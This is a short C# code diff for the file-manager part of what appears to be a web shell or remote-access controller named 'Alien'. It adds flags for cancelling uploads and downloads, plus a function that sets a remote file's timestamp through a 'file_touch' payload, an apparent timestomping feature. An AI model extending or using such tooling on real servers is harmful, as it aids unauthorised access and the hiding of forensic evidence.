@@ -22,6 +22,9 @@ namespace Alien
         public List<stEntry> m_dirClipboard { get; set; } = new List<stEntry>();
         public List<stEntry> m_fileClipboard { get; set; } = new List<stEntry>();
 
+        public bool m_bUploadFile { get; set; } = false;
+        public bool m_bDownloadFile { get; set; } = false;
+
         public clsfnFileMgr(clsWeb web)
         {
             m_web = web;
@@ -388,6 +391,9 @@ namespace Alien
 
                     do
                     {
+                        if (!m_bDownloadFile)
+                            break;
+
                         szResp = await m_web.fnszSendPayload("file_download", new string[]
                         {
                             szRemoteFilePath,
@@ -495,6 +501,22 @@ namespace Alien
                 throw new Exception("JSON deserialization failed.");
 
             return wget;
+        }
+
+        public async Task<bool> fnSetTimestamp(string szFilePath, long unixTimestamp)
+        {
+            string szResp = await m_web.fnszSendPayload("file_touch", new string[] { szFilePath, unixTimestamp.ToString() });
+            if (string.IsNullOrEmpty(szResp))
+                throw new Exception("HTTP response is null or empty.");
+
+            string[] s = szResp.Split('|');
+            int nCode = int.Parse(s[0]);
+            string szMsg = s[1];
+
+            if (nCode == 0)
+                throw new Exception(szMsg);
+
+            return true;
         }
     }
 }
